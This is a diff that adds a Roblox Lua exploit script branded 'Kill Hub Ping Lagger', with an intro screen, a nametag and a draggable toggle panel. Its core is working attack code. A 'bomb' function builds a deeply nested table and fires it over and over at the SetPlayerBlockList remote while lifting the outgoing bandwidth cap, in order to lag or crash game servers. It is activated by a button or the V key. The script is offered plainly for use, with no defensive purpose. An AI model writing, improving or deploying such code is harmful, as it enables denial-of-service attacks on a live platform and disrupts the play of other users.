@@ -1,0 +1,416 @@
+--[[LFWM1_wU_R93mIQd5Pt-Sq1RjwJz38sU6Zu55m]]
+do
+  local lfwm_bc78d5977eafaa9c = "LFWM1_wU_R93mIQd5Pt-Sq1RjwJz38sU6Zu55m"
+  if false then error(lfwm_bc78d5977eafaa9c) end
+end
+
+-- ============================================================
+--  INTRO (fades in with background image, KILL HUB title, yellow line)
+-- ============================================================
+repeat task.wait() until game:IsLoaded()
+
+local _introEnabled = true
+
+if _introEnabled then
+    task.spawn(function()
+        local TS = game:GetService("TweenService")
+        local introGui = Instance.new("ScreenGui")
+        introGui.Name = "KillHubIntro"
+        introGui.IgnoreGuiInset = true
+        introGui.DisplayOrder = 100
+        introGui.ResetOnSpawn = false
+        introGui.Parent = game:GetService("CoreGui")
+
+        -- Background image using the provided asset ID
+        local darkBg = Instance.new("ImageLabel", introGui)
+        darkBg.Size = UDim2.new(1, 0, 1, 0)
+        darkBg.BackgroundTransparency = 1
+        darkBg.Image = "rbxassetid://119052158269104"
+        darkBg.ImageTransparency = 0
+        darkBg.ZIndex = 1
+
+        local sound = Instance.new("Sound", introGui)
+        sound.SoundId = "rbxassetid://72740886806799"
+        sound.Volume = 0.9
+        sound:Play()
+
+        local center = Instance.new("Frame", introGui)
+        center.AnchorPoint = Vector2.new(0.5, 0.5)
+        center.Position = UDim2.new(0.5, 0, 0.5, 0)
+        center.Size = UDim2.new(0, 400, 0, 120)
+        center.BackgroundTransparency = 1
+        center.ZIndex = 5
+
+        local title = Instance.new("TextLabel", center)
+        title.Size = UDim2.new(1, 0, 0, 80)
+        title.Position = UDim2.new(0, 0, 0, 20)
+        title.BackgroundTransparency = 1
+        title.Text = "KILL HUB"
+        title.TextColor3 = Color3.fromRGB(255, 255, 255)
+        title.Font = Enum.Font.GothamBlack
+        title.TextSize = 72
+        title.TextTransparency = 1
+        title.ZIndex = 6
+
+        local accentLine = Instance.new("Frame", center)
+        accentLine.AnchorPoint = Vector2.new(0.5, 0)
+        accentLine.Position = UDim2.new(0.5, 0, 0.85, 0)
+        accentLine.Size = UDim2.new(0, 0, 0, 3)
+        accentLine.BackgroundColor3 = Color3.fromRGB(255, 255, 0)  -- yellow
+        accentLine.BorderSizePixel = 0
+        accentLine.ZIndex = 6
+        Instance.new("UICorner", accentLine).CornerRadius = UDim.new(1, 0)
+
+        task.wait(0.3)
+        TS:Create(title, TweenInfo.new(0.8, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {TextTransparency = 0}):Play()
+        
+        task.wait(0.2)
+        TS:Create(accentLine, TweenInfo.new(0.6, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0, 300, 0, 3)}):Play()
+
+        task.wait(2.8)
+        sound:Stop()
+
+        TS:Create(title, TweenInfo.new(0.4), {TextTransparency = 1}):Play()
+        TS:Create(accentLine, TweenInfo.new(0.4), {Size = UDim2.new(0, 0, 0, 3)}):Play()
+        TS:Create(darkBg, TweenInfo.new(0.5), {ImageTransparency = 1}):Play()
+
+        task.wait(0.7)
+        introGui:Destroy()
+    end)
+end
+
+-- ============================================================
+--  REST OF THE SCRIPT (nametag, GUI, lagger, etc.)
+-- ============================================================
+
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- ============================================================
+--  LAGGER CODE (copied from Ace lagger)
+-- ============================================================
+
+local isMobile = UserInputService.TouchEnabled and not UserInputService.MouseEnabled
+
+local LAGGER_CONFIG = isMobile and {
+    TableIncrease = 290,
+    Tries         = 1,
+    LoopWaitTime  = 0.85
+} or {
+    TableIncrease = 265,
+    Tries         = 1,
+    LoopWaitTime  = 0.05
+}
+
+local CUSTOM_REMOTE_PATH = "RobloxReplicatedStorage.SetPlayerBlockList"
+
+local function resolveRemote(path)
+    if not path or path == "" then return nil end
+    local obj = game
+    local cleaned = path:gsub("^game%.", "")
+    for segment in cleaned:gmatch("[^%.]+") do
+        if obj then
+            obj = obj[segment]
+        else
+            return nil
+        end
+    end
+    return obj
+end
+
+local function getmaxvalue(val)
+    local mainvalueifonetable = 499999
+    if type(val) ~= "number" then return nil end
+    return mainvalueifonetable / (val + 2)
+end
+
+local function bomb(tableincrease, tries)
+    local maintable    = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+
+    for i = 1, tableincrease do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+
+    local maximum = getmaxvalue(tableincrease) or 9999999
+    for i = 1, maximum do
+        table.insert(maintable, spammedtable)
+        if i % 5000 == 0 then task.wait() end
+    end
+
+    local remote = resolveRemote(CUSTOM_REMOTE_PATH)
+    if remote then
+        for i = 1, tries do
+            pcall(function()
+                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
+                    remote:FireServer(maintable)
+                elseif remote:IsA("RemoteFunction") then
+                    remote:InvokeServer(maintable)
+                end
+            end)
+        end
+    end
+end
+
+local laggerEnabled = false
+local laggerThread  = nil
+
+local function startLaggerLoop()
+    while laggerEnabled do
+        pcall(function()
+            game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
+        end)
+        task.spawn(function()
+            bomb(LAGGER_CONFIG.TableIncrease, LAGGER_CONFIG.Tries)
+        end)
+        task.wait(math.max(LAGGER_CONFIG.LoopWaitTime, 0.15))
+    end
+end
+
+local function stopLaggerLoop()
+    laggerEnabled = false
+    if laggerThread then
+        coroutine.close(laggerThread)
+        laggerThread = nil
+    end
+end
+
+local function startLagger()
+    if laggerThread then return end
+    laggerEnabled = true
+    laggerThread = coroutine.create(startLaggerLoop)
+    coroutine.resume(laggerThread)
+end
+
+-- ============================================================
+--  NAMETAG ON TOP OF PLAYER (The text + shield)
+-- ============================================================
+
+local function setupNametag(character)
+    -- Clean up old nametag if it exists
+    local existing = character:FindFirstChild("KillHubNametag")
+    if existing then existing:Destroy() end
+
+    local head = character:FindFirstChild("Head")
+    if not head then return end
+
+    -- Create the BillboardGui above the head
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "KillHubNametag"
+    bb.Parent = head
+    bb.AlwaysOnTop = true
+    bb.Size = UDim2.new(0, 160, 0, 85)
+    bb.StudsOffset = Vector3.new(0, 2.5, 0)
+
+    -- Shield image
+    local shield = Instance.new("ImageLabel")
+    shield.Parent = bb
+    shield.Size = UDim2.new(0, 50, 0, 50)
+    shield.Position = UDim2.new(0.5, -25, 0, 0)
+    shield.BackgroundTransparency = 1
+    shield.Image = "rbxassetid://119052158269104"
+    shield.ScaleType = Enum.ScaleType.Fit
+
+    -- Text label – changed to "Best Lagger Kill Hub"
+    local discordLbl = Instance.new("TextLabel")
+    discordLbl.Parent = bb
+    discordLbl.Size = UDim2.new(1, 0, 0, 28)
+    discordLbl.Position = UDim2.new(0, 0, 0.65, 0)
+    discordLbl.BackgroundTransparency = 1
+    discordLbl.Text = "Best Lagger Kill Hub"   -- <--- THIS IS THE CHANGE
+    discordLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    discordLbl.Font = Enum.Font.GothamBlack
+    discordLbl.TextScaled = true
+    discordLbl.TextStrokeTransparency = 0
+    discordLbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+end
+
+-- Handle nametag when character spawns
+if player.Character then
+    setupNametag(player.Character)
+end
+player.CharacterAdded:Connect(setupNametag)
+
+-- ============================================================
+--  KILL HUB LAGGER GUI (Kept for the toggle button)
+-- ============================================================
+
+local oldGui = playerGui:FindFirstChild("KillHubPingUI")
+if oldGui then oldGui:Destroy() end
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "KillHubPingUI"
+gui.ResetOnSpawn = false
+gui.IgnoreGuiInset = true
+gui.Parent = playerGui
+
+-- Main card
+local card = Instance.new("Frame")
+card.Name = "MainCard"
+card.AnchorPoint = Vector2.new(0.5, 0.5)
+card.Position = UDim2.fromScale(0.5, 0.5)
+card.Size = UDim2.fromOffset(405, 160)
+card.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+card.BorderSizePixel = 0
+card.Active = true
+card.Parent = gui
+
+local cardCorner = Instance.new("UICorner")
+cardCorner.CornerRadius = UDim.new(0, 24)
+cardCorner.Parent = card
+
+local cardStroke = Instance.new("UIStroke")
+cardStroke.Color = Color3.fromRGB(80, 80, 80)
+cardStroke.Thickness = 2
+cardStroke.Parent = card
+
+-- Art background inside card
+local art = Instance.new("ImageLabel")
+art.Name = "AssetArtwork"
+art.Size = UDim2.fromScale(1, 1)
+art.BackgroundTransparency = 1
+art.Image = "rbxassetid://119052158269104"
+art.ImageTransparency = 0.4
+art.ScaleType = Enum.ScaleType.Crop
+art.ZIndex = 1
+art.Parent = card
+
+local artCorner = Instance.new("UICorner")
+artCorner.CornerRadius = UDim.new(0, 24)
+artCorner.Parent = art
+
+-- Title
+local title = Instance.new("TextLabel")
+title.AnchorPoint = Vector2.new(0, 0.5)
+title.Position = UDim2.new(0, 26, 0, 35)
+title.Size = UDim2.new(1, -178, 0, 30)
+title.BackgroundTransparency = 1
+title.Font = Enum.Font.GothamBlack
+title.Text = "KILL HUB PING LAGGER"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextSize = 18
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.ZIndex = 3
+title.Parent = card
+
+-- Top-right buttons (minus and gear)
+local function makeIconButton(text, position, font)
+    local button = Instance.new("TextButton")
+    button.AnchorPoint = Vector2.new(0.5, 0.5)
+    button.Position = position
+    button.Size = UDim2.fromOffset(42, 42)
+    button.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+    button.BorderSizePixel = 0
+    button.Text = text
+    button.TextColor3 = Color3.fromRGB(255, 255, 255)
+    button.TextSize = 26
+    button.Font = font
+    button.ZIndex = 4
+    button.Parent = card
+
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 9)
+    corner.Parent = button
+    return button
+end
+
+local minusBtn = makeIconButton("−", UDim2.new(1, -90, 0, 35), Enum.Font.GothamBold)
+local gearBtn = makeIconButton("⚙", UDim2.new(1, -38, 0, 35), Enum.Font.GothamBold)
+
+-- Activation button
+local activate = Instance.new("TextButton")
+activate.Name = "ActivateButton"
+activate.AnchorPoint = Vector2.new(0.5, 0.5)
+activate.Position = UDim2.new(0.5, 0, 0.68, 0)
+activate.Size = UDim2.new(1, -52, 0, 50)
+activate.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+activate.BorderSizePixel = 0
+activate.AutoButtonColor = false
+activate.Font = Enum.Font.GothamBlack
+activate.Text = "ACTIVATE"
+activate.TextColor3 = Color3.fromRGB(255, 255, 255)
+activate.TextSize = 19
+activate.ZIndex = 4
+activate.Parent = card
+
+local activateCorner = Instance.new("UICorner")
+activateCorner.CornerRadius = UDim.new(0, 12)
+activateCorner.Parent = activate
+
+local activateStroke = Instance.new("UIStroke")
+activateStroke.Color = Color3.fromRGB(100, 100, 100)
+activateStroke.Thickness = 1
+activateStroke.Parent = activate
+
+-- Toggle Logic
+local isToggled = false
+
+local function setToggle(state)
+    isToggled = state
+    laggerEnabled = state
+
+    if state then
+        startLagger()
+        activate.Text = "DEACTIVATE"
+        activate.BackgroundColor3 = Color3.fromRGB(0, 180, 80)
+    else
+        stopLaggerLoop()
+        activate.Text = "ACTIVATE"
+        activate.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+    end
+end
+
+local function flipToggle()
+    setToggle(not isToggled)
+end
+
+activate.MouseButton1Click:Connect(flipToggle)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if gameProcessed then return end
+    if input.KeyCode == Enum.KeyCode.V then
+        flipToggle()
+    end
+end)
+
+-- Drag Logic
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+card.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = card.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+card.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        card.Position = UDim2.new(
+            startPos.X.Scale, startPos.X.Offset + delta.X,
+            startPos.Y.Scale, startPos.Y.Offset + delta.Y
+        )
+    end
+end)
